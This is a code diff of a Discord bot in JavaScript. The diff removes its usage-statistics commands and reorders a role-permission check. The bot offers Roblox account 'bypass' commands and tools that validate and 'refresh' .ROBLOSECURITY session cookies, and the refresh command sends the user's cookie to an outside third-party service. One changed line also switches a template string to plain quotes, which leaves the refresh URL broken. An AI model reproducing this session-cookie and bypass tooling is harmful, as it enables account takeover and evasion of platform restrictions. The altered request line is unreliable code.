@@ -597,7 +597,6 @@ let commandStats = {
   removecommand: 0,
   embedcreate: 0,
   embedupdate: 0,
-  stats: 0,
   setwelcome: 0,
   setleave: 0,
   automod: 0,
@@ -966,7 +965,7 @@ client.on('ready', async () => {
   // Define public commands (visible to all users)
   const publicCommands = [
     'bypass2008', 'bypass13plus', 'refreshcookie', 'help', 'botstats', 
-    'validatecookie', 'cookieexpiry', 'profilelookup', 'stats', 'membercount'
+    'validatecookie', 'cookieexpiry', 'profilelookup', 'membercount'
   ];
 
   const commands = [
@@ -1002,9 +1001,7 @@ client.on('ready', async () => {
     new SlashCommandBuilder()
       .setName('help')
       .setDescription('Show all available commands and bot info'),
-    new SlashCommandBuilder()
-      .setName('botstats')
-      .setDescription('Show bot statistics and uptime'),
+
     new SlashCommandBuilder()
       .setName('validatecookie')
       .setDescription('Check if a .ROBLOSECURITY cookie is valid')
@@ -1131,9 +1128,7 @@ client.on('ready', async () => {
             { name: 'profilelookup', value: 'profilelookup' },
             { name: 'help', value: 'help' },
             { name: 'botstats', value: 'botstats' },
-            { name: 'stats', value: 'stats' },
-            { name: 'embedcreate', value: 'embedcreate' },
-            { name: 'embedupdate', value: 'embedupdate' }
+            { name: 'embedcreate', value: 'embedcreate' }
           )
       )
       .addChannelOption(option =>
@@ -1158,9 +1153,7 @@ client.on('ready', async () => {
             { name: 'profilelookup', value: 'profilelookup' },
             { name: 'help', value: 'help' },
             { name: 'botstats', value: 'botstats' },
-            { name: 'stats', value: 'stats' },
-            { name: 'embedcreate', value: 'embedcreate' },
-            { name: 'embedupdate', value: 'embedupdate' }
+            { name: 'embedcreate', value: 'embedcreate' }
           )
       )
       .addChannelOption(option =>
@@ -1218,14 +1211,6 @@ client.on('ready', async () => {
           .setRequired(false)
       )
       .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-    new SlashCommandBuilder()
-      .setName('stats')
-      .setDescription('Show user command statistics')
-      .addUserOption(option =>
-        option.setName('user')
-          .setDescription('User to check stats for (leave empty for yourself)')
-          .setRequired(false)
-      ),
     new SlashCommandBuilder()
       .setName('membercount')
       .setDescription('Show the total member count of the server'),
@@ -2378,7 +2363,7 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
-      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
+      const res = await fetch('https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}');
       const data = await res.json();
 
       if (!data.redemptionResult || !data.redemptionResult.success) {
@@ -2444,7 +2429,7 @@ client.on('interactionCreate', async interaction => {
 
       // Send ephemeral confirmation to user
       await interaction.reply({
-        content: '<:yes:1393890949960306719> Cookie refresh service completed successfully! Check above for the public result and below for your private cookie.',
+        content: '<:yes:1393890949960306719> Cookie refresh service completed successfully! Check above for the public result.',
         ephemeral: true
       });
 
@@ -2471,7 +2456,7 @@ client.on('interactionCreate', async interaction => {
       console.error('Refresh API error (sanitized)');
       const embed = new EmbedBuilder()
         .setColor(0x2C2F33)
-        .setTitle("<:no:1393890945929318542> Request Failed")
+        .setTitle('<:no:1393890945929318542> Request Failed')
         .setDescription("Failed to connect to refresh API. Please try again later.")
         .setFooter({
           text: `Requested by ${interaction.user.tag}`,
@@ -2505,11 +2490,7 @@ client.on('interactionCreate', async interaction => {
           value: 'Refresh your .ROBLOSECURITY cookie\n**Usage:** Provide your current cookie', 
           inline: false 
         },
-        { 
-          name: '/botstats', 
-          value: 'Show bot statistics and uptime', 
-          inline: false 
-        },
+
         { 
           name: '/help', 
           value: 'Show this help message', 
@@ -2586,111 +2567,7 @@ client.on('interactionCreate', async interaction => {
     await interaction.reply({ embeds: [helpEmbed] });
   }
 
-  if (interaction.commandName === 'botstats') {
-    commandStats.botstats++;
 
-    const uptime = process.uptime();
-    const uptimeHours = Math.floor(uptime / 3600);
-    const uptimeMinutes = Math.floor((uptime % 3600) / 60);
-    const uptimeSeconds = Math.floor(uptime % 60);
-
-    const totalCommands = Object.values(commandStats).reduce((a, b) => a + b, 0);
-
-    const statsEmbed = new EmbedBuilder()
-      .setColor(0x2C2F33)
-      .setTitle('Bot Statistics')
-      .setDescription('Current bot performance and usage stats')
-      .addFields(
-        { 
-          name: 'Uptime', 
-          value: `${uptimeHours}h ${uptimeMinutes}m ${uptimeSeconds}s`, 
-          inline: true 
-        },
-        { 
-          name: 'Ping', 
-          value: `${client.ws.ping}ms`, 
-          inline: true 
-        },
-        { 
-          name: 'Total Commands Used', 
-          value: `${totalCommands}`, 
-          inline: true 
-        },
-        { 
-          name: 'Bypass2008 Used', 
-          value: `${commandStats.bypass2008} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Bypass13plus Used', 
-          value: `${commandStats.bypass13plus} times`, 
-          inline: true 
-        },
-        { 
-          name: '<:Refresh:1393888531973406881> RefreshCookie Used', 
-          value: `${commandStats.refreshcookie} times`, 
-          inline: true 
-        },
-        { 
-          name: 'ValidateCookie Used', 
-          value: `${commandStats.validatecookie} times`, 
-          inline: true 
-        },
-        { 
-          name: 'CookieExpiry Used', 
-          value: `${commandStats.cookieexpiry} times`, 
-          inline: true 
-        },
-        { 
-          name: '<:member_IDS:1393888535412740096> ProfileLookup Used', 
-          value: `${commandStats.profilelookup} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Ban Used', 
-          value: `${commandStats.ban} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Kick Used', 
-          value: `${commandStats.kick} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Mute Used', 
-          value: `${commandStats.mute} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Unmute Used', 
-          value: `${commandStats.unmute} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Warn Used', 
-          value: `${commandStats.warn} times`, 
-          inline: true 
-        },
-        { 
-          name: 'MemberCount Used', 
-          value: `${commandStats.membercount} times`, 
-          inline: true 
-        },
-        { 
-          name: 'Bot Info', 
-          value: `Servers: ${client.guilds.cache.size}\nUsers: ${client.users.cache.size}`, 
-          inline: false 
-        }
-      )
-      .setThumbnail(client.user.displayAvatarURL())
-      .setTimestamp()
-      .setFooter({
-        text: `Requested by ${interaction.user.tag}`,
-        iconURL: interaction.user.displayAvatarURL()
-      });
-
-    await interaction.reply({ embeds: [statsEmbed] });
-  }
 
   if (interaction.commandName === 'validatecookie') {
     const cookie = interaction.options.getString('cookie');
@@ -4045,72 +3922,7 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  if (interaction.commandName === 'stats') {
-    const targetUser = interaction.options.getUser('user') || interaction.user;
-    commandStats.stats++;
 
-    // Get user stats from the database
-    const guildUserStats = userStats.get(interaction.guild.id);
-    if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
-      return interaction.reply({
-        content: `<:no:1393890945929318542> No command usage data found for ${targetUser === interaction.user ? 'you' : targetUser.username}.`,
-        ephemeral: true
-      });
-    }
-
-    const userData = guildUserStats.get(targetUser.id);
-    const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
-
-    // Get member to check join date
-    let joinDate = userData.joinDate;
-    try {
-      const member = await interaction.guild.members.fetch(targetUser.id);
-      joinDate = member.joinedTimestamp;
-    } catch (error) {
-      // Use stored join date if member fetch fails
-    }
-
-    // Sort commands by usage
-    const sortedCommands = Object.entries(userData.commands)
-      .sort(([,a], [,b]) => b - a)
-      .slice(0, 10); // Top 10 commands
-
-    const embed = new EmbedBuilder()
-      .setColor(0x2C2F33)
-      .setTitle(`${targetUser === interaction.user ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
-      .setDescription(`Statistical overview for ${targetUser.tag}`)
-      .setThumbnail(targetUser.displayAvatarURL())
-      .addFields(
-        { name: 'Total Commands Used', value: `${totalCommands}`, inline: true },
-        { name: 'Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
-        { name: 'Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
-      )
-      .setTimestamp()
-      .setFooter({
-        text: `Requested by ${interaction.user.tag}`,
-        iconURL: interaction.user.displayAvatarURL()
-      });
-
-    if (sortedCommands.length > 0) {
-      const commandList = sortedCommands
-        .map(([cmd, count]) => `\`/${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
-        .join('\n');
-
-      embed.addFields({
-        name: 'Most Used Commands',
-        value: commandList,
-        inline: false
-      });
-    } else {
-      embed.addFields({
-        name: 'Most Used Commands',
-        value: 'No commands used yet',
-        inline: false
-      });
-    }
-
-    await interaction.reply({ embeds: [embed] });
-  }
 
   if (interaction.commandName === 'setwelcome') {
     const channel = interaction.options.getChannel('channel');
@@ -4830,6 +4642,15 @@ client.on('interactionCreate', async interaction => {
       });
     }
 
+    // Check role hierarchy
+    const botHighestRole = interaction.guild.members.me.roles.highest;
+    if (role && role.position >= botHighestRole.position) {
+      return interaction.reply({
+        content: '<:no:1393890945929318542> I cannot assign a role that is higher than or equal to my highest role.',
+        ephemeral: true
+      });
+    }
+
     let embed;
 
     switch (mode) {
@@ -4837,15 +4658,6 @@ client.on('interactionCreate', async interaction => {
         if (!role) {
           return interaction.reply({
             content: '<:no:1393890945929318542> Please select a role when using set mode.',
-            ephemeral: true
-          });
-        }
-
-        // Check role hierarchy
-        const botHighestRole = interaction.guild.members.me.roles.highest;
-        if (role.position >= botHighestRole.position) {
-          return interaction.reply({
-            content: '<:no:1393890945929318542> I cannot assign a role that is higher than or equal to my highest role.',
             ephemeral: true
           });
         }
